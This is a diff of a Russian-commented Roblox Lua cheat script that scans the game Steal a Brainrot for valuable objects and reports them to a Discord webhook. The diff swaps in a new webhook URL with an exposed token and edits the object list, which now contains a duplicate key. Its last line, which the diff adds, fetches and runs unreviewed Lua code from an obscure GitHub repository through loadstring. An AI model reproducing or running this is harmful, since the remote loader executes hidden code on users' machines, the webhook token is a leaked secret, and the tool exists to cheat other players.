@@ -1,4 +1,3 @@
-
 -- 🎯 BRAINROT INCOME SCANNER v2.0 (ПОЛНАЯ ВЕРСИЯ)
 -- Сканирует все объекты в Steal a Brainrot и отправляет уведомления в Discord
 -- Запуск: автоматически при старте + по клавише F
@@ -9,8 +8,8 @@ local HttpService = game:GetService('HttpService')
 
 -- ⚙️ НАСТРОЙКИ
 local INCOME_THRESHOLD = 50_000_000 -- 50M/s минимум для уведомления
-local HIGH_PRIORITY_THRESHOLD = 500_000_000 -- 500M/s для особо важных объектов
-local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1424140516911484928/mnVh-97c9qW-g8Ymhneg3bkBkV3MgMWkUa3t9tAGHDuMEzb6MAfT3llXK_6ibAHkoRRs'
+local HIGH_PRIORITY_THRESHOLD = 300_000_000 -- 500M/s для особо важных объектов
+local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1424146317604687932/G5mtYy3JUjj0I8OQxIyxBDfr2oU0tHGe96R00BnoUDeRGukoPeSYn4AJBAnCrHJz0da4'
 
 print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
 
@@ -26,28 +25,36 @@ local OBJECTS = {
     ['Spaghetti Tualetti'] = { emoji = '🚽', important = true },
     ['Ketchuru and Musturu'] = { emoji = '🍾', important = true },
     ['Tralaledon'] = { emoji = '🦈', important = true },
-    ['La Extinct Grande'] = { emoji = '🩻', important = true, high_priority = true },
     ['Tictac Sahur'] = { emoji = '🕰️', important = true },
     ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
     ['Tang Tang Keletang'] = { emoji = '📢', important = true },
     ['Money Money Puggy'] = { emoji = '🐶', important = true }, 
     ['Burguro And Fryuro'] = { emoji = '🍔', important = true },
-    ['Chillin Chili'] = { emoji = '🌶', important = true, high_priority = true },
+    ['Chillin Chili'] = { emoji = '🌶', important = true },
     ['La Secret Combinasion'] = { emoji = '❓', important = true },
     ['Eviledon'] = { emoji = '👹', important = true },
     ['Spooky and Pumpky'] = { emoji = '🎃', important = true, },
     ['La Spooky Grande'] = { emoji = '👻', important = true, high_priority = true },
     ['Meowl'] = { emoji = '🐈', important = true },
-    ['Chipso and Queso'] = { emoji = '🧀', important = true, high_priority = true },
+    ['Chipso and Queso'] = { emoji = '🧀', important = true },
     ['La Casa Boo'] = { emoji = '👁‍🗨', important = true },
     ['Headless Horseman'] = { emoji = '🐴', important = true },
-    ['Mariachi Corazoni'] = { emoji = '💀', important = true },
     ['Los Tacoritas'] = { emoji = '🚴', important = true },
-    ['Tacorita Bicicleta'] = { emoji = '🚵‍♂️', important = true },
     ['Capitano Moby'] = { emoji = '🚢', important = true },
     ['La Taco Combinasion'] = { emoji = '👒', important = true },
-    ['Gobblino Uniciclino'] = { emoji = '🦮', important = true },
+    ['Cooki and Milki'] = { emoji = '🍪', important = true },
+    ['Los Puggies'] = { emoji = '🦮', important = true },
+    ['Orcaledon'] = { emoji = '🐡', important = true },
+    ['Fragrama and Chocrama'] = { emoji = '🐡', important = true },
+    ['Guest 666'] = { emoji = '㊙️', important = true },
+    ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
+    ['Los Bros'] = { emoji = '📱', important = true },
+    ['Los Planitos'] = { emoji = '🌍', important = true },
     ['Lavadorito Spinito'] = { emoji = '📺', important = true },
+    ['W or L'] = { emoji = '🪜', important = true },
+    ['Fishino Clownino'] = { emoji = '🤡', important = true },
+    ['La Ginger Sekolah'] = { emoji = '🎄', important = true },
+    ['Tung Tu1ng Tu1ng Sa2hur'] = { emoji = '🪦', important = true },
 }
 
 -- Создаем списки важных объектов
@@ -560,6 +567,7 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         scanAndNotify()
     end
 end)
+
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhook готов к отправке уведомлений')
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ldkoedkeo/eblan2222/refs/heads/main/noob.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
